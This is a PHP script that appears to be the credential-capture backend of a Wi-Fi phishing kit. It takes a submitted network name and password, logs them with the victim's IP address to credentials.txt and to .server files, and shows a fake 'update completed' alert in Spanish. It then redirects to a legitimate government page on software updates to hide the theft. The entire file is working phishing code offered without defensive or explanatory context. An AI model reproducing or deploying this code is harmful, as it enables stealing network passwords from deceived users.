<?php

$ssid = $_POST['ssid'];
$pass = $_POST['pass'];

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$cred = fopen("credentials.txt", "a");
fwrite($cred, "IP Address: ".$ip."\n");
fwrite($cred, "SSID: ".$ssid."\n");
fwrite($cred, "Password: ".$pass."\n");
fclose($cred);

try{
    $ipfile = fopen(".server/ip.txt", "w");
}
catch(Exception $e){
    $ipfile = fopen(".server\\ip.txt", "w");
}
finally{
    fwrite($ipfile, $ip);
    fclose($ipfile);
}

try{
    $file = fopen(".server/pass.txt", "w");
}
catch(Exception $e){
    $file = fopen(".server\\pass.txt", "w");
}
finally{
    fwrite($file, $pass);
    fclose($file);
}

echo "<script>
    setTimeout(function() {
        alert('Actualización realizada');
        window.location.href = 'https://cncs.gob.do/la-importancia-de-las-actualizaciones/';
    }, 6000);
</script>";

?>